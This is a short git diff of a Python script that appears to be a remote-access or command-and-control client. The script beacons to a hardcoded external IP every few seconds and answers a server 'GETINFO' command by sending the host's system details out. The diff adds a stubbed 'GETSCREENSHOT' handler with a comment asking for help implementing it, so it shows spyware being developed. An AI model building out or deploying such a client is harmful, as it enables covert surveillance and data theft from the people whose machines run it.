@@ -1,6 +1,7 @@
 import platform
 import socket
 from requests import get
+import requests
 import time
 
 ip = '54.79.26.131'  # Server IP
@@ -48,8 +49,11 @@ def main():
 
             # If the server sends a GETINFO command, send back PC info
             if response.startswith(":COMMAND :GETINFO"):
-                print("[+] Command: GETINFO")
                 send_pcinfo()
+            
+            elif response.startswith(":COMMAND :GETSCREENSHOT"):
+                pass
+                #constel help me
 
             # Handle other responses here if needed
             elif response.startswith("OTHER"):
@@ -59,7 +63,7 @@ def main():
         except Exception as e:
             print(f"[!] Error: {e}")  # Print error if connection fails
 
-        time.sleep(10)  # Wait before trying again
+        time.sleep(7)  # Wait before trying again
 
 if __name__ == "__main__":
     main()  # Run the main function
